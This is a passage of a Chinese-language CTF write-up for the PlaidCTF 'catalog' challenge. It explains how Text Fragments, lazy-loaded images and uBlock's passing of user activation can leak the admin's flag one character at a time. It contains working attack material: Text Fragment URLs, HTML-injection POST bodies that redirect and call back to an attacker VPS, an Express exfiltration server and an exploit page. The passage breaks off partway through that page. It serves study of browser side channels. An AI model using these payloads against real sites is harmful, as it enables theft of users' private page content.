src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png" alt=""></p><p>所以这时候我们就可以利用<code>#:~:text=P-,C,T,-F</code>进行选中了。</p><h3 id="Spark-Thinking"><a href="#Spark-Thinking" class="headerlink" title="Spark Thinking"></a>Spark Thinking</h3><p>那么如何判断我们是否选中了呢？</p><p>这里 Exp 作者很聪明地想到了一个办法：</p><ul><li>利用我们在 information 段提到的同一 session 会存储一定的 HTML 元素，所以即使登录状态下，我们也可以利用 fetch no-cors 来更新界面，利用登录失败在另一个同一 session 的界面得到无过滤的 HTML 注入</li><li>利用这个登录失败的 HTML 注入创造判断条件：注入足够多的<code>&lt;br&gt;</code>标签，让 FLAG 位于用户视窗页面之外，并在<code>&lt;br&gt;</code>的最后加入一个图片，利用图片懒加载来确定 Text Fragments 是否匹配到了 FLAG</li><li>一开始因为图片被放置到了用户视窗之外并且由于图片懒加载，图片并不会请求对应的资源，这时如果<code>#:~:text=P-,C,T,-F</code>匹配到了，因为我们注入的<code>&lt;br&gt;</code>标签的原因，页面会先进行滚动到 FLAG 的位置，这时候，图片才会加载对应的资源，所以我们就可以利用图片懒加载来确定匹配成功；如果匹配不成功的话，就不会请求对应的资源</li><li>所以这时我们只需要利用自己的 vps 监听一个端口让懒加载的图片在触发请求时，请求我们的 vps 就可以判断是否匹配成功了</li></ul><blockquote class="colorquote info"><p>Note:</p><blockquote><p>Support the ‘loading’ attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on <code>&lt;iframe&gt;</code> and <code>&lt;img&gt;</code> elements.</p></blockquote><p>也就是说只有当用户窗口页面内关注到<code>&lt;img&gt;</code>标签时，该标签才能加载对应的资源。我们可以使用<code>&lt;img&gt;</code>原生属性<code>loading=lazy</code>来实现，Chrome 76以后的版本都已实现了该功能——<a href="https://chromestatus.com/feature/5645767347798016" target="_blank" rel="noopener">Lazily load iframes and images via ‘loading’ attribute</a></p></blockquote><p>至此，基本上比较关键的地方我们都说完了，剩下的就是实现以及一些细节的地方了。</p><h3 id="uBlock-amp-User-Activation-amp-Text-Fragments"><a href="#uBlock-amp-User-Activation-amp-Text-Fragments" class="headerlink" title="uBlock &amp; User Activation &amp; Text Fragments"></a>uBlock &amp; User Activation &amp; Text Fragments</h3><p>这时我们再来回头看 uBlock &amp; User Activation 在整个过程起到了什么作用呢？</p><p>因为 Chrome 80 引入了 Text Fragments 的机制，综上我们的分析利用可以产生一个新的攻击面，用这种“侧信道”的攻击方式我们可以窃取用户隐私，所以当然出于隐私考虑， Google 也引入了相对的限制机制：</p><blockquote><p>The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a “noopener” context, such that the destination page is known to be sufficiently isolated.</p></blockquote><p>我们可以注意到其中非常关键的一句话： <em>*<em>In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. *</em></em></p><p>也就是说 Text Fragments 功能仅在由于 User Activation 产生的完整导向上才能生效，没有 User Activation 是无法使用该功能的！在其他地方我们也可以看到 Google 对于 *<em>User Activation *</em> 做了很多的强调：</p><blockquote><p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</p></blockquote><p><em><strong>For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></em></p><p>因此，基于 User Activation 和浏览上下文隔离的限制非常重要，必须予以实施。</p><p>至于 Chrome 如何实现限制该功能的，具体可以参考文档 <a href="https://wicg.github.io/ScrollToTextFragment/#restricting-the-text-fragment" target="_blank" rel="noopener">Restricting the Text Fragment</a> ，这里就不详述了。</p><p>从以上来看，出题人的题图就很明显了：</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.</p></blockquote><p>并且根据 <a href="https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/" target="_blank" rel="noopener">User Activation v2 in Chrome</a> ：</p><blockquote><p>Full-overlay request from subframes: To grant a subframe’s full-overlay request (sent through a postMessage), the main frame will check the subframe’s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage’s <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">event source</a> parameter.</p></blockquote><p>两者结合在一起可能就比较容易理解了，<strong>以下是个人根据文档理解，并没有参考研究具体代码实现，如果有师傅根据代码研究出结果与我的理解有什么出入，那一定是我错了</strong>：</p><p>个人理解：管理员单击一个我们提交打的链接，将消耗一个用户激活打开链接，而 uBlock 将 <code>postMessage</code> 发送到其扩展 iframe ，从而复制用户激活。 每当页面加载时，前端都会从 uBlock 框架获取 postMessage ，从而再次将激活复制回去。</p><p>我们可以从 <a href="#Verification">Verification</a> 看到关于 uBlock 传递 User Activation 的验证。</p><h3 id="Regex"><a href="#Regex" class="headerlink" title="Regex"></a>Regex</h3><p>因为 FLAG 正则为 <code>/^PCTF\{[A-Z0-9_]+\}$/</code>，我们每次用 Text Fragments 只能验证一个字符，例如我们可以构造如下 url ，一次可以匹配完全部的符合正则的字符，A-Z0-9_ 外加一个 } 为 FLAG 闭合的字符</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-J%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-K%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-L%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-M%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">N</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-O%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-P%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Q%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-R%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-S%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">T</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-U%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-V%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-W%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-X%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Y%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Z%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-_</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果匹配了，则去掉一半的字符，采用二分的形式缩小我们的匹配范围，所以下一次我们可以发送的是</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果匹配了，就继续在这个范围二分，不匹配就用另一个范围</p><h3 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h3><p>这个部分就只是提供复现的步骤，下个部分提供详细的攻击链解释：</p><ol><li><p>注册一个账号，创建一个 issue ，并记录该 issue 的数字 id，为了方便辨识，该数字 id 我们称为 issue_id_1 ，post http 包的 body 内容为：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_1&amp;title=3&amp;content=1&amp;image=z"/&gt;&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">"http://your_vps/fragment"</span>&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">"refresh"</span>+content="0;URL='http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%<span class="hljs-attribute">26text</span>=T-,F,{,-0%<span class="hljs-attribute">26text</span>=T-,F,{,-1%<span class="hljs-attribute">26text</span>=T-,F,{,-2%<span class="hljs-attribute">26text</span>=T-,F,{,-3%<span class="hljs-attribute">26text</span>=T-,F,{,-4%<span class="hljs-attribute">26text</span>=T-,F,{,-5%<span class="hljs-attribute">26text</span>=T-,F,{,-6%<span class="hljs-attribute">26text</span>=T-,F,{,-7%<span class="hljs-attribute">26text</span>=T-,F,{,-8%<span class="hljs-attribute">26text</span>=T-,F,{,-9%<span class="hljs-attribute">26text</span>=T-,F,{,-A%<span class="hljs-attribute">26text</span>=T-,F,{,-B%<span class="hljs-attribute">26text</span>=T-,F,{,-D%<span class="hljs-attribute">26text</span>=T-,F,{,-E%<span class="hljs-attribute">26text</span>=T-,F,{,-F%<span class="hljs-attribute">26text</span>=T-,F,{,-G%<span class="hljs-attribute">26text</span>=T-,F,{,-H%<span class="hljs-attribute">26text</span>=T-,F,{,-I%<span class="hljs-attribute">26text</span>=T-,F,{,-J%<span class="hljs-attribute">26text</span>=T-,F,{,-K%<span class="hljs-attribute">26text</span>=T-,F,{,-L%<span class="hljs-attribute">26text</span>=T-,F,{,-M%<span class="hljs-attribute">26text</span>=T-,F,{,-N%<span class="hljs-attribute">26text</span>=T-,F,{,-O%<span class="hljs-attribute">26text</span>=T-,F,{,-P%<span class="hljs-attribute">26text</span>=T-,F,{,-Q%<span class="hljs-attribute">26text</span>=T-,F,{,-R%<span class="hljs-attribute">26text</span>=T-,F,{,-S%<span class="hljs-attribute">26text</span>=T-,F,{,-T%<span class="hljs-attribute">26text</span>=T-,F,{,-U%<span class="hljs-attribute">26text</span>=T-,F,{,-V%<span class="hljs-attribute">26text</span>=T-,F,{,-W%<span class="hljs-attribute">26text</span>=T-,F,{,-X%<span class="hljs-attribute">26text</span>=T-,F,{,-Y%<span class="hljs-attribute">26text</span>=T-,F,{,-Z%<span class="hljs-attribute">26text</span>=T-,F,{,-_<span class="hljs-string">'"&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>再创建一个 issue ， 并记录该 issue 的数字 id，为了方便辨识，该数字 id 我们称为 issue_id_2，post http 包的 body 内容为：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_2&amp;title=3&amp;content=1&amp;image="&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">"refresh"</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">"0;URL='http://your_vps/'"</span>&gt;"</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>自己的 vps 上用 node 运行如下 exp.js</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> unlock = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> match = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/status"</span>, (req, res) =&gt; {</span><br><span class="line">    res.send(<span class="hljs-string">`<span class="hljs-subst">${status}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/unlock"</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">"unlock"</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/firstload"</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; Admin opened challenge's page"</span>);</span><br><span class="line">    res.send(<span class="hljs-string">"firstload"</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/"</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; Admin was redirected to attacker's page"</span>);</span><br><span class="line">    res.sendFile(<span class="hljs-string">"index.html"</span>, {</span><br><span class="line">        root: __dirname</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/injection"</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; HTML injection was inserted into id=3 catalog"</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; There was a match"</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; There wasn't a match"</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">"injection"</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/exfiltrated"</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">"exfiltrated"</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">"/fragment"</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; Admin was fragmented"</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">"fragment"</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(port);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Server running on port: "</span> + port);</span><br></pre></td></tr></tbody></table></figure><p></p><p>index.html:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Psst! Get out of here...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> next = <span class="hljs-keyword">async</span> () =&gt; {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> res  = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">"/status"</span>);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">if</span> (status === <span class="hljs-string">"true"</span>) {</span></span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">"http://catalog.pwni.ng/user.php"</span>, {</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">"headers"</span>: {</span></span><br><span class="line"><span class="hljs-actionscript">                            <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>,</span></span><br><span class="line">                        },</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                        "body": `username="/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://your_vps/injection"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span 